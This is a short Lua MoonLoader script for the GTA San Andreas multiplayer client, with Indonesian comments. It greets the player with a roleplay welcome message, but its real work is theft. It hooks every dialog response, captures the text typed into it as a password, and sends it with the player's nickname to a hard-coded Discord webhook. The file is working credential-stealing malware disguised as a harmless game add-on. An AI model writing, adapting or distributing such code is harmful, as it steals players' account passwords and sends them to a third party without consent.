require 'lib.moonloader'
local requests = require 'requests'
local sampev = require 'lib.samp.events'
local nickplayer

-- Fungsi utama kalo samp dh siap
function main()
    while not isSampAvailable() do
        wait(100)
    end
    sampAddChatMessage("Selamat Beroleplay Maniesz", 0x1CDBFF)
    nickplayer = getPlayerNick() -- ngambil nickname player
end

-- Fungsi buat ambil nickname player
function getPlayerNick()
    local boolean, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local getname = sampGetPlayerNickname(id)
    return getname
end

-- Fungsi ini bakal di panggil setiap ada dialog yang di kirim
function sampev.onSendDialogResponse(dialogId, button, listItem, inputText)
    -- Ganti "1" dengan ID tombol Enter yang sesuai aja
    if button == 1 then  -- Asumsikan 1 itu ID tombol Enter
        local message = string.format('Username: %s Password: %s', nickplayer, inputText)
        sendToDiscord(message)
    end
end

-- fungsi buat ngirim data ke discord
function sendToDiscord(message)
    local webhook_url = "https://discord.com/api/webhooks/1364565083354566726/FGqYPTzxnxKQG13Ajde5MUGjzUDJuSQ9HlawrIYLRJrQYJrIwvspkUnGPLrl8KRmKc6x" -- Ganti dengan URL webhook kamu

    -- Meminta POST ke webhook Discord
    local response = requests.post{
        url = webhook_url,
        headers = {
            ["Content-Type"] = "application/json"
        },
        data = '{"content":"' .. message .. '"}'
    }
end
